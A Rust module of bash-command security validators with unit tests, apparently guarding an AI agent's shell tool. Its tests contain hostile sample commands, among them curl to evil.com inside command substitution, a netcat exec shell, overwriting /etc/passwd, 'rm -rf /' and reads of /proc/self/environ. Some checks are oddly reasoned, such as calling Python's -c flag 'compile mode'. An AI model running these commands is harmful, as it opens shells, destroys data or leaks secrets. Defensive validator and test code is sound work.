//! Security validators for bash commands.
//!
//! Ported from Claude Code bashSecurity.ts

use crate::tools::bash::security::constants::{
    COMMAND_SUBSTITUTION_PATTERNS, ZSH_DANGEROUS_COMMANDS,
};
use crate::tools::bash::security::quote::QuoteState;

/// Validation error with context
#[derive(Debug)]
pub struct ValidationError {
    pub message: String,
}

/// Main entry point: validate a bash command
pub fn validate_bash_command(command: &str) -> Result<(), ValidationError> {
    let trimmed = command.trim();

    if trimmed.is_empty() {
        return Err(ValidationError {
            message: "Empty command".to_string(),
        });
    }

    // Phase A: Core security checks (high coverage, low false positive)

    // 1. Command substitution
    validate_command_substitution(trimmed)?;

    // 2. Output redirection (already have some, but extend it)
    validate_output_redirection(trimmed)?;

    // 3. Zsh dangerous commands
    validate_zsh_dangerous(trimmed)?;

    // 4. Git commit injection
    validate_git_commit(trimmed)?;

    // 5. Proc environ access
    validate_proc_environ(trimmed)?;

    // 6. Brace expansion
    validate_brace_expansion(trimmed)?;

    // 7. Control characters
    validate_control_chars(trimmed)?;

    // Phase B: Advanced checks

    // 8. IFS injection
    validate_ifs_injection(trimmed)?;

    // 9. Backslash escaped operators
    validate_backslash_escaped_operators(trimmed)?;

    // Phase C: Network & tool security checks

    // 10. JQ command security
    validate_jq_command(trimmed)?;

    // 11. Curl/Wget/Ssh/Nc security
    validate_network_commands(trimmed)?;

    // 12. Shell command structure
    validate_command_structure(trimmed)?;

    // 13. Heredoc security
    validate_heredoc(trimmed)?;

    // Phase D: Extended security checks

    // 14. Find command security
    validate_find_command(trimmed)?;

    // 15. Tar command security
    validate_tar_command(trimmed)?;

    // 16. AWK/Sed command execution
    validate_awk_sed_command(trimmed)?;

    // 17. Env/Proxy bypass
    validate_env_injection(trimmed)?;

    // 18. Environment variable manipulation
    validate_env_manipulation(trimmed)?;

    // 19. Encoded command execution
    validate_encoded_commands(trimmed)?;

    // 20. Hidden character bypass
    validate_hidden_chars(trimmed)?;

    // 21. Script interpreter security
    validate_scripting_languages(trimmed)?;

    // 22. Deep pipe analysis
    validate_pipe_depth(trimmed)?;

    Ok(())
}

/// Validate command substitution patterns
fn validate_command_substitution(command: &str) -> Result<(), ValidationError> {
    for (pattern, description) in COMMAND_SUBSTITUTION_PATTERNS {
        if command.contains(pattern) {
            // But allow it if inside quotes
            let (with_double, _) = QuoteState::extract_unquoted(command);
            if with_double.contains(pattern) {
                return Err(ValidationError {
                    message: format!("Blocked: {} — not allowed", description),
                });
            }
        }
    }

    // Also check backticks (not in the list above)
    let mut state = QuoteState::new();
    for c in command.chars() {
        let was_escaped = state.is_escaped();
        state.update(c);

        if c == '`' && !state.is_quoted() && !was_escaped {
            return Err(ValidationError {
                message: "Backtick command substitution is not allowed".to_string(),
            });
        }
    }

    Ok(())
}

/// Validate output redirection
fn validate_output_redirection(command: &str) -> Result<(), ValidationError> {
    // Block > to sensitive paths (but not >> append)
    // Look for > without quotes
    let fully_unquoted = QuoteState::extract_unquoted(command).1;

    // Check for > redirection to sensitive paths in unquoted content
    // Pattern: word > /path or word> /path
    let redirect_patterns = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/root",
        "/.ssh/",
        "/.bashrc",
        "/.bash_profile",
        "/.zshrc",
    ];

    for pattern in redirect_patterns {
        // Simple check: look for "> pattern" in unquoted content
        let search = format!("> {}", pattern);
        if fully_unquoted.contains(&search) {
            return Err(ValidationError {
                message: format!("Output redirection to '{}' is not allowed", pattern),
            });
        }
    }

    // Block unsafe redirections like > /dev/null is OK, but 2>&1 combined
    // Check for >& or &> (fd duplication)
    if fully_unquoted.contains("&>") || fully_unquoted.contains(">&") {
        // Allow 2>&1 (stderr to stdout) but block others
        if fully_unquoted.contains("2>&1") {
            // This is OK
        } else if fully_unquoted.contains("&>") || fully_unquoted.contains(">&") {
            // Check it's not just 2>&1
            let re = regex::Regex::new(r"&\d*>&?\d*").unwrap();
            for cap in re.find_iter(&fully_unquoted) {
                let m = cap.as_str();
                if m != "2>&1" && m != ">&2" {
                    return Err(ValidationError {
                        message: format!("Dangerous file descriptor redirection '{}' is not allowed", m),
                    });
                }
            }
        }
    }

    Ok(())
}

/// Validate Zsh dangerous commands
fn validate_zsh_dangerous(command: &str) -> Result<(), ValidationError> {
    // Get the first word (base command)
    let first_word = command
        .split_whitespace()
        .next()
        .unwrap_or("")
        .split('/')
        .next_back()
        .unwrap_or("");

    let first_lower = first_word.to_lowercase();

    // Check for Zsh dangerous commands
    for zsh_cmd in ZSH_DANGEROUS_COMMANDS {
        if first_lower == *zsh_cmd {
            return Err(ValidationError {
                message: format!(
                    "Zsh command '{}' is not allowed for security reasons",
                    zsh_cmd
                ),
            });
        }
    }

    // Also check if command contains zmodload patterns like "zmodload zsh/..."
    let unquoted = QuoteState::extract_unquoted(command).1;
    if unquoted.contains("zmodload") && !in_single_quoted(command, "zmodload") {
        return Err(ValidationError {
            message: "zmodload is not allowed for security reasons".to_string(),
        });
    }

    Ok(())
}

/// Check if pattern is inside single quotes
fn in_single_quoted(s: &str, pattern: &str) -> bool {
    let mut in_quote = false;
    for part in s.split('\'') {
        if in_quote && part.contains(pattern) {
            return true;
        }
        in_quote = !in_quote;
    }
    false
}

/// Get the fully unquoted content
fn fully_unquoted(s: &str) -> String {
    QuoteState::extract_unquoted(s).1
}

/// Validate git commit patterns
fn validate_git_commit(command: &str) -> Result<(), ValidationError> {
    // Only check git commit commands
    let first_word = command.split_whitespace().next().unwrap_or("");
    if first_word != "git" {
        return Ok(());
    }

    // Check for git commit -m with potential injection
    // Block git commit -m "$()" or git commit -m '$(...)'
    if command.contains("git commit") && command.contains("-m") {
        // Check if -m argument contains command substitution
        let unquoted = fully_unquoted(command);
        if unquoted.contains("git commit") && (unquoted.contains("$( ") || unquoted.contains("`")) {
            return Err(ValidationError {
                message: "git commit message cannot contain command substitution".to_string(),
            });
        }
    }

    Ok(())
}

/// Validate /proc environ access
fn validate_proc_environ(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Block access to /proc/*/environ
    if unquoted.contains("/proc/")
        && (unquoted.contains("/environ") || unquoted.contains("environ"))
    {
        // Check for /proc/self/environ, /proc/1/environ, /proc/*/environ patterns
        let re = regex::Regex::new(r"/proc/([\d]+|self)/environ").unwrap();
        if re.is_match(&unquoted) {
            return Err(ValidationError {
                message: "Access to /proc/*/environ is not allowed (could expose environment variables)".to_string(),
            });
        }
    }

    Ok(())
}

/// Validate brace expansion
fn validate_brace_expansion(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Check for unbalanced braces (indicates possible brace expansion)
    // Count unescaped { and }
    let mut brace_depth = 0;
    let mut escaped = false;
    let mut has_brace_expansion = false;

    for c in unquoted.chars() {
        if c == '\\' && !escaped {
            escaped = true;
            continue;
        }
        if c == '{' {
            brace_depth += 1;
        } else if c == '}' {
            if brace_depth == 0 {
                // Unmatched }, could be attack
                return Err(ValidationError {
                    message: "Unmatched closing brace".to_string(),
                });
            }
            brace_depth -= 1;
        } else if c == ',' && brace_depth > 0 {
            // Comma inside braces indicates brace expansion
            has_brace_expansion = true;
        }
        escaped = false;
    }

    // Block brace expansion like {a,b} or {1,2,3}
    if has_brace_expansion {
        return Err(ValidationError {
            message: "Brace expansion is not allowed".to_string(),
        });
    }

    // If we have unclosed braces at the end, it might be brace expansion
    // But allow {1..3} style which is common
    if brace_depth > 0 {
        return Err(ValidationError {
            message: "Unbalanced braces detected — possible brace expansion attack".to_string(),
        });
    }

    Ok(())
}

/// Validate control characters
fn validate_control_chars(command: &str) -> Result<(), ValidationError> {
    for (_i, c) in command.char_indices() {
        // Check for control characters 0x00-0x1f except tab (0x09), newline (0x0a), CR (0x0d)
        let code = c as u32;
        if code <= 0x1f && code != 0x09 && code != 0x0a && code != 0x0d {
            return Err(ValidationError {
                message: format!("Control character 0x{:02x} is not allowed", code),
            });
        }
    }

    // Also check for DEL character
    if command.contains('\x7f') {
        return Err(ValidationError {
            message: "DEL character (0x7f) is not allowed".to_string(),
        });
    }

    Ok(())
}

/// Validate IFS injection
fn validate_ifs_injection(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Block $IFS and ${...IFS...} patterns
    if unquoted.contains("$IFS") || unquoted.contains("${IFS") {
        return Err(ValidationError {
            message: "IFS variable manipulation is not allowed".to_string(),
        });
    }

    Ok(())
}

/// Validate backslash escaped operators
fn validate_backslash_escaped_operators(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Check for escaped operators like \; or \|
    // These could bypass operator checks
    let escaped_operators = [';', '|', '&', '<', '>'];

    let mut escaped = false;
    for c in unquoted.chars() {
        if c == '\\' {
            escaped = true;
            continue;
        }
        if escaped && escaped_operators.contains(&c) {
            return Err(ValidationError {
                message: format!(
                    "Escaped operator '\\{}' is not allowed",
                    c
                ),
            });
        }
        escaped = false;
    }

    Ok(())
}

/// Validate JQ command security
fn validate_jq_command(command: &str) -> Result<(), ValidationError> {
    let first_word = command.split_whitespace().next().unwrap_or("");
    if first_word != "jq" {
        return Ok(());
    }

    let unquoted = fully_unquoted(command);

    // Block dangerous jq flags that can execute code or read files
    let dangerous_flags = [
        "--run", "-e",  // execute filter
        "-f",           // read filter from file
        "--from-file",  // read filter from file
    ];

    for flag in dangerous_flags {
        if unquoted.contains(flag) {
            return Err(ValidationError {
                message: format!("jq '{}' flag is not allowed (can execute arbitrary code)", flag),
            });
        }
    }

    Ok(())
}

/// Validate network command security (curl, wget, ssh, nc)
fn validate_network_commands(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);
    let first_word = command.split_whitespace().next().unwrap_or("");

    match first_word {
        "curl" | "wget" => {
            // Block output to sensitive paths
            let sensitive_redirects = [
                "/etc/passwd", "/etc/shadow", "/etc/sudoers",
                "/root", "/.ssh/", "/.bashrc", "/.bash_profile",
            ];
            for pattern in sensitive_redirects {
                if unquoted.contains("-o") && unquoted.contains(pattern) {
                    return Err(ValidationError {
                        message: format!("{} output to '{}' is not allowed", first_word, pattern),
                    });
                }
                if unquoted.contains("--output") && unquoted.contains(pattern) {
                    return Err(ValidationError {
                        message: format!("{} output to '{}' is not allowed", first_word, pattern),
                    });
                }
            }

            // Block --data-binary with large inline data potential
            if (unquoted.contains("--data-binary") || unquoted.contains("-d"))
                && (unquoted.contains("$(") || unquoted.contains("`"))
            {
                return Err(ValidationError {
                    message: format!("{} with inline data containing command substitution is not allowed", first_word),
                });
            }
        }
        "nc" | "netcat" | "ncat" => {
            // Block execution flags
            if unquoted.contains("-e") || unquoted.contains("--exec") || unquoted.contains("-c") {
                return Err(ValidationError {
                    message: "netcat -e/-c (execute) is not allowed".to_string(),
                });
            }
            // Block listening mode with dangerous options
            if unquoted.contains("-l") && (unquoted.contains("-p") || unquoted.contains("-k")) {
                // Allow basic listening but warn about -k (keep-open)
            }
        }
        "ssh" => {
            // Block ProxyCommand and LocalCommand options
            if unquoted.contains("ProxyCommand") || unquoted.contains("LocalCommand") {
                return Err(ValidationError {
                    message: "ssh ProxyCommand/LocalCommand is not allowed".to_string(),
                });
            }
            // Block -o options that could be dangerous
            let re = regex::Regex::new(r"-o\s+\w+=").unwrap();
            if re.is_match(&unquoted) {
                // Check for dangerous options
                let dangerous_opts = ["ProxyCommand", "LocalCommand", "ControlMaster", "ControlPath"];
                for opt in dangerous_opts {
                    if unquoted.contains(opt) {
                        return Err(ValidationError {
                            message: format!("ssh -o {} is not allowed", opt),
                        });
                    }
                }
            }
        }
        _ => {}
    }

    Ok(())
}

/// Validate command structure for dangerous patterns
fn validate_command_structure(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Block dangerous multi-command patterns
    let dangerous_patterns = [
        (r";\s*(rm\s+-rf|dd\s+|mkfs\s+|shutdown|reboot)", "dangerous command after semicolon"),
        (r"\|\s*(sh|bash|zsh)\s*$", "pipe to shell"),
        (r"&&\s*(rm\s+-rf|dd\s+|mkfs\s+)", "dangerous command after &&"),
        (r"\|\|.*(rm\s+-rf|dd\s+|mkfs)", "dangerous command after ||"),
        (r"2>&1\s*&", "stderr redirect to background"),
    ];

    for (pattern, desc) in dangerous_patterns {
        let re = regex::Regex::new(pattern).unwrap();
        if re.is_match(&unquoted) {
            return Err(ValidationError {
                message: format!("Dangerous command structure: {}", desc),
            });
        }
    }

    // Block nested command substitution depth > 2
    let nested_count = unquoted.matches("$(").count();
    if nested_count > 2 {
        return Err(ValidationError {
            message: "Nested command substitution depth exceeds limit".to_string(),
        });
    }

    Ok(())
}

/// Validate heredoc security
fn validate_heredoc(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Block command substitution with heredoc
    if unquoted.contains("$(cat <<") || unquoted.contains("`<<") {
        return Err(ValidationError {
            message: "Heredoc inside command substitution is not allowed".to_string(),
        });
    }

    // Block here-string with command substitution
    if unquoted.contains("<<<") && unquoted.contains("$(") {
        return Err(ValidationError {
            message: "Here-string with command substitution is not allowed".to_string(),
        });
    }

    // Block here-doc redirection operator <<- (strips tabs)
    if unquoted.contains("<<-") {
        return Err(ValidationError {
            message: "Here-doc with tab stripping (<<-) is not allowed".to_string(),
        });
    }

    Ok(())
}

/// Validate find command security
fn validate_find_command(command: &str) -> Result<(), ValidationError> {
    let first_word = command.split_whitespace().next().unwrap_or("");
    if first_word != "find" {
        return Ok(());
    }

    let unquoted = fully_unquoted(command);

    // Block dangerous find flags
    let dangerous_flags = ["-exec", "-execdir", "-ok", "-okdir", "-delete", "-prune"];
    for flag in dangerous_flags {
        if unquoted.contains(flag) {
            if flag == "-exec" && (unquoted.contains("{} \\;") || unquoted.contains("{};")) {
                return Err(ValidationError {
                    message: "find -exec with shell invocation is not allowed".to_string(),
                });
            }
            if flag != "-exec" {
                return Err(ValidationError {
                    message: format!("find {} is not allowed", flag),
                });
            }
        }
    }

    Ok(())
}

/// Validate tar command security
fn validate_tar_command(command: &str) -> Result<(), ValidationError> {
    let first_word = command.split_whitespace().next().unwrap_or("");
    if first_word != "tar" {
        return Ok(());
    }

    let unquoted = fully_unquoted(command);

    // Block checkpoint actions (arbitrary code execution)
    if unquoted.contains("--checkpoint") || unquoted.contains("--checkpoint-action") {
        return Err(ValidationError {
            message: "tar checkpoint actions are not allowed".to_string(),
        });
    }

    // Block device file extraction
    if unquoted.contains("-p") && unquoted.contains("/dev/") {
        return Err(ValidationError {
            message: "tar device extraction is not allowed".to_string(),
        });
    }

    // Block remote archive extraction
    if unquoted.contains("-xvf") && (unquoted.contains("http://") || unquoted.contains("https://") || unquoted.contains("ftp://")) {
        return Err(ValidationError {
            message: "tar remote archive extraction is not allowed".to_string(),
        });
    }

    Ok(())
}

/// Validate AWK/Sed command execution
fn validate_awk_sed_command(command: &str) -> Result<(), ValidationError> {
    let first_word = command.split_whitespace().next().unwrap_or("");
    if first_word != "awk" && first_word != "sed" && first_word != "gawk" {
        return Ok(());
    }

    // AWK system() and getline can execute arbitrary code (use original command for quoted content)
    if command.contains("system(") || command.contains("getline") {
        return Err(ValidationError {
            message: "AWK system() or getline is not allowed".to_string(),
        });
    }

    // Sed piping to shell (use original command since |/bin/sh may be in quotes)
    if command.contains("|") && (command.contains("/bin/sh") || command.contains("/bin/bash")) {
        return Err(ValidationError {
            message: "Sed piping to shell is not allowed".to_string(),
        });
    }

    // Sed -e with shell commands
    let unquoted = fully_unquoted(command);
    if unquoted.contains("sed") && unquoted.contains("-e") && unquoted.contains(";") {
        return Err(ValidationError {
            message: "Sed command chaining with shell is not allowed".to_string(),
        });
    }

    Ok(())
}

/// Validate env/proxy bypass attempts
fn validate_env_injection(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Block env -i (clean environment bypass)
    if unquoted.contains("env -i") {
        return Err(ValidationError {
            message: "env -i (clean environment) is not allowed".to_string(),
        });
    }

    // Block proxy environment variable injection
    let proxy_vars = ["HTTP_PROXY", "HTTPS_PROXY", "FTP_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "ftp_proxy", "all_proxy"];
    for var in proxy_vars {
        if unquoted.contains(&format!("{}=", var)) || unquoted.contains(&format!("export {}", var)) {
            return Err(ValidationError {
                message: "Proxy environment variable injection is not allowed".to_string(),
            });
        }
    }

    Ok(())
}

/// Validate environment variable manipulation attacks
fn validate_env_manipulation(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Block BASH_ENV, ENV, CDPATH manipulation (shell startup script attacks)
    let dangerous_vars = ["BASH_ENV", "ENV", "CDPATH", "MAIL", "MAILPATH", "HISTFILE", "HOSTFILE", "INPUTRC"];
    for var in dangerous_vars {
        if unquoted.contains(&format!("{}=", var)) || unquoted.contains(&format!("export {}", var)) {
            return Err(ValidationError {
                message: format!("Environment variable {} manipulation is not allowed", var),
            });
        }
    }

    Ok(())
}

/// Validate encoded command execution
fn validate_encoded_commands(command: &str) -> Result<(), ValidationError> {
    // Block base64 decode execution patterns (use original command for quoted checks)
    if (command.contains("base64 -d") || command.contains("base64 --decode")) && (command.contains("$(") || command.contains("`")) {
        return Err(ValidationError {
            message: "Base64 decode with command substitution is not allowed".to_string(),
        });
    }

    // Block rot13 execution
    if command.contains("tr 'A-Za-z' 'N-ZA-Mn-za-m'") || command.contains("rot13") {
        return Err(ValidationError {
            message: "Rot13 encoding execution is not allowed".to_string(),
        });
    }

    // Block hex encoding execution
    let unquoted = fully_unquoted(command);
    if unquoted.contains("xxd -r") || (command.contains("printf") && command.contains("\\x")) {
        return Err(ValidationError {
            message: "Hex encoded command execution is not allowed".to_string(),
        });
    }

    Ok(())
}

/// Validate hidden character bypass attempts
fn validate_hidden_chars(command: &str) -> Result<(), ValidationError> {
    // Check for zero-width characters
    let hidden_chars = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}'];
    for c in command.chars() {
        if hidden_chars.contains(&c) {
            return Err(ValidationError {
                message: "Hidden unicode characters (zero-width) are not allowed".to_string(),
            });
        }
    }

    // Check for RTL/LTR override characters
    let direction_chars = ['\u{202A}', '\u{202B}', '\u{202C}', '\u{202D}', '\u{202E}'];
    for c in command.chars() {
        if direction_chars.contains(&c) {
            return Err(ValidationError {
                message: "Text direction override characters are not allowed".to_string(),
            });
        }
    }

    Ok(())
}

/// Validate scripting language security
fn validate_scripting_languages(command: &str) -> Result<(), ValidationError> {
    let first_word = command.split_whitespace().next().unwrap_or("");

    if first_word == "python" || first_word == "python3" || first_word == "python2" || first_word == "perl" || first_word == "ruby" || first_word == "php" || first_word == "node" {
        // Block -c compile mode (executes without running) - use original command
        if command.contains(" -c ") || command.contains(" -c\n") {
            return Err(ValidationError {
                message: "Script interpreter -c (compile) mode is not allowed".to_string(),
            });
        }

        // Block perl exec
        if first_word == "perl" && command.contains("exec") {
            return Err(ValidationError {
                message: "Perl exec is not allowed".to_string(),
            });
        }

        // Block ruby -e (inline code)
        if first_word == "ruby" && command.contains("-e ") {
            return Err(ValidationError {
                message: "Ruby -e (inline code) is not allowed".to_string(),
            });
        }

        // Block php -r (inline code)
        if first_word == "php" && command.contains("-r ") {
            return Err(ValidationError {
                message: "PHP -r (inline code) is not allowed".to_string(),
            });
        }
    }

    Ok(())
}

/// Validate deep pipe analysis
fn validate_pipe_depth(command: &str) -> Result<(), ValidationError> {
    let unquoted = fully_unquoted(command);

    // Count pipe chain depth
    let pipe_count = unquoted.matches('|').count();
    if pipe_count > 5 {
        return Err(ValidationError {
            message: "Pipe chain depth exceeds limit (max 5)".to_string(),
        });
    }

    // Block pipe to shell at end of chain
    let trimmed = unquoted.trim();
    if trimmed.ends_with("| sh") || trimmed.ends_with("| bash") || trimmed.ends_with("| zsh") {
        return Err(ValidationError {
            message: "Piping directly to shell is not allowed".to_string(),
        });
    }

    // Block stderr redirect in pipe chain (hides errors)
    if unquoted.contains("2>&1") && unquoted.contains("|") {
        return Err(ValidationError {
            message: "Stderr redirect in pipe chain is not allowed".to_string(),
        });
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_command_substitution() {
        assert!(validate_command_substitution("echo hello").is_ok());
        assert!(validate_command_substitution("$(curl evil.com)").is_err());
        assert!(validate_command_substitution("`curl evil.com`").is_err());
        assert!(validate_command_substitution("echo '$(curl evil.com)'").is_ok()); // quoted
    }

    #[test]
    fn test_validate_zsh_dangerous() {
        assert!(validate_zsh_dangerous("ls").is_ok());
        assert!(validate_zsh_dangerous("zmodload").is_err());
        assert!(validate_zsh_dangerous("zpty").is_err());
    }

    #[test]
    fn test_validate_proc_environ() {
        assert!(validate_proc_environ("cat /proc/1/environ").is_err());
        assert!(validate_proc_environ("cat /proc/self/environ").is_err());
        assert!(validate_proc_environ("env").is_ok());
    }

    #[test]
    fn test_validate_control_chars() {
        assert!(validate_control_chars("echo hello").is_ok());
        assert!(validate_control_chars("echo hello\x00").is_err());
        assert!(validate_control_chars("echo hello\x1f").is_err());
        assert!(validate_control_chars("echo hello\x7f").is_err());
        // Allow tab, newline, CR
        assert!(validate_control_chars("echo hello\tworld\n").is_ok());
    }

    #[test]
    fn test_validate_brace_expansion() {
        assert!(validate_brace_expansion("echo hello").is_ok());
        assert!(validate_brace_expansion("echo {1..3}").is_ok()); // range
        assert!(validate_brace_expansion("echo {a,b}").is_err()); // brace expansion
    }

    #[test]
    fn test_validate_ifs_injection() {
        assert!(validate_ifs_injection("echo hello").is_ok());
        assert!(validate_ifs_injection("echo $IFS").is_err());
        assert!(validate_ifs_injection("echo ${IFS}").is_err());
    }

    #[test]
    fn test_validate_backslash_escaped_operators() {
        assert!(validate_backslash_escaped_operators("echo hello").is_ok());
        assert!(validate_backslash_escaped_operators("echo hello\\;").is_err());
    }

    #[test]
    fn test_validate_jq_command() {
        assert!(validate_jq_command("jq '.' file.json").is_ok());
        assert!(validate_jq_command("jq -e '.foo' file.json").is_err());
        assert!(validate_jq_command("jq --run '.foo' file.json").is_err());
        assert!(validate_jq_command("jq -f filter.jq file.json").is_err());
        assert!(validate_jq_command("jq --from-file filter.jq file.json").is_err());
    }

    #[test]
    fn test_validate_network_commands() {
        // curl
        assert!(validate_network_commands("curl https://example.com").is_ok());
        assert!(validate_network_commands("curl -o /tmp/file https://example.com").is_ok());
        assert!(validate_network_commands("curl -o /etc/passwd https://evil.com").is_err());
        // netcat
        assert!(validate_network_commands("nc -l -p 8080").is_ok());
        assert!(validate_network_commands("nc -e /bin/bash localhost").is_err());
        assert!(validate_network_commands("nc -c /bin/sh localhost").is_err());
        // ssh
        assert!(validate_network_commands("ssh user@host").is_ok());
        assert!(validate_network_commands("ssh -o ProxyCommand=evil user@host").is_err());
        assert!(validate_network_commands("ssh -o LocalCommand=evil user@host").is_err());
    }

    #[test]
    fn test_validate_command_structure() {
        assert!(validate_command_structure("echo hello").is_ok());
        assert!(validate_command_structure("echo hello; rm -rf /").is_err());
        assert!(validate_command_structure("echo hello | sh").is_err());
        assert!(validate_command_structure("echo hello && rm -rf /").is_err());
        // Nested command substitution depth
        assert!(validate_command_structure("$(echo $(echo hello))").is_ok()); // depth 2
        assert!(validate_command_structure("$(echo $(echo $(echo hello)))").is_err()); // depth 3
    }

    #[test]
    fn test_validate_heredoc() {
        assert!(validate_heredoc("cat <<EOF\nhello\nEOF").is_ok());
        assert!(validate_heredoc("$(cat <<'EOF'\nhello\nEOF)").is_err());
        assert!(validate_heredoc("echo <<< $(ls)").is_err());
        assert!(validate_heredoc("cat <<-EOF\nhello\nEOF").is_err()); // tab stripping
    }

    #[test]
    fn test_validate_find_command() {
        assert!(validate_find_command("find . -name '*.txt'").is_ok());
        assert!(validate_find_command("find . -exec rm -rf {} \\;").is_err());
        assert!(validate_find_command("find . -delete").is_err());
        assert!(validate_find_command("find . -ok rm {} \\;").is_err());
        assert!(validate_find_command("find . -execdir ls \\;").is_err());
    }

    #[test]
    fn test_validate_tar_command() {
        assert!(validate_tar_command("tar -cvf archive.tar file.txt").is_ok());
        assert!(validate_tar_command("tar -xvf archive.tar").is_ok());
        assert!(validate_tar_command("tar --checkpoint=1").is_err());
        assert!(validate_tar_command("tar --checkpoint-action='exec=id'").is_err());
        assert!(validate_tar_command("tar -xvf http://example.com/evil.tar").is_err());
    }

    #[test]
    fn test_validate_awk_sed_command() {
        assert!(validate_awk_sed_command("awk '{print $1}' file.txt").is_ok());
        assert!(validate_awk_sed_command("sed 's/foo/bar/' file.txt").is_ok());
        assert!(validate_awk_sed_command("awk '{system(\"ls\")}' file.txt").is_err());
        assert!(validate_awk_sed_command("sed 's/foo/bar/ | /bin/sh'").is_err());
        assert!(validate_awk_sed_command("gawk 'BEGIN {getline}'").is_err());
    }

    #[test]
    fn test_validate_env_injection() {
        assert!(validate_env_injection("echo $PATH").is_ok());
        assert!(validate_env_injection("env -i bash").is_err());
        assert!(validate_env_injection("HTTP_PROXY=evil curl example.com").is_err());
        assert!(validate_env_injection("export HTTPS_PROXY=evil").is_err());
        assert!(validate_env_injection("ALL_PROXY=socks5://evil curl example.com").is_err());
    }

    #[test]
    fn test_validate_env_manipulation() {
        assert!(validate_env_manipulation("echo $HOME").is_ok());
        assert!(validate_env_manipulation("export BASH_ENV=/tmp/evil").is_err());
        assert!(validate_env_manipulation("ENV=/tmp/evil bash").is_err());
        assert!(validate_env_manipulation("CDPATH=/ root").is_err());
        assert!(validate_env_manipulation("HISTFILE=/dev/null").is_err());
    }

    #[test]
    fn test_validate_encoded_commands() {
        assert!(validate_encoded_commands("echo 'aGVsbG8gd29ybGQ=' | base64 -d").is_ok());
        assert!(validate_encoded_commands("echo $(echo 'cm0gLXJmIC8=') | base64 -d").is_err());
        assert!(validate_encoded_commands("echo test | tr 'A-Za-z' 'N-ZA-Mn-za-m'").is_err());
        assert!(validate_encoded_commands("printf '\\x61\\x62\\x63'").is_err());
    }

    #[test]
    fn test_validate_hidden_chars() {
        assert!(validate_hidden_chars("echo hello").is_ok());
        assert!(validate_hidden_chars("echo hello\u{200B}world").is_err()); // zero-width space
        assert!(validate_hidden_chars("echo hello\u{200C}world").is_err()); // zero-width non-joiner
        assert!(validate_hidden_chars("echo hello\u{202E}world").is_err()); // RTL override
    }

    #[test]
    fn test_validate_scripting_languages() {
        assert!(validate_scripting_languages("python script.py").is_ok());
        assert!(validate_scripting_languages("python -c 'print(1)'").is_err());
        assert!(validate_scripting_languages("perl script.pl").is_ok());
        assert!(validate_scripting_languages("perl -e 'exec \"ls\"'").is_err());
        assert!(validate_scripting_languages("ruby script.rb").is_ok());
        assert!(validate_scripting_languages("ruby -e 'puts 1'").is_err());
    }

    #[test]
    fn test_validate_pipe_depth() {
        assert!(validate_pipe_depth("cat a.txt | grep foo | sort | uniq").is_ok());
        assert!(validate_pipe_depth("cat a.txt | grep foo | sort | uniq | head").is_ok());
        assert!(validate_pipe_depth("cat a.txt | grep foo | sort | uniq | head | wc -l | awk '{print $1}'").is_err()); // 6 pipes
        assert!(validate_pipe_depth("echo hello | sh").is_err());
        assert!(validate_pipe_depth("cat file.txt | grep foo 2>&1 | bar").is_err());
    }
}
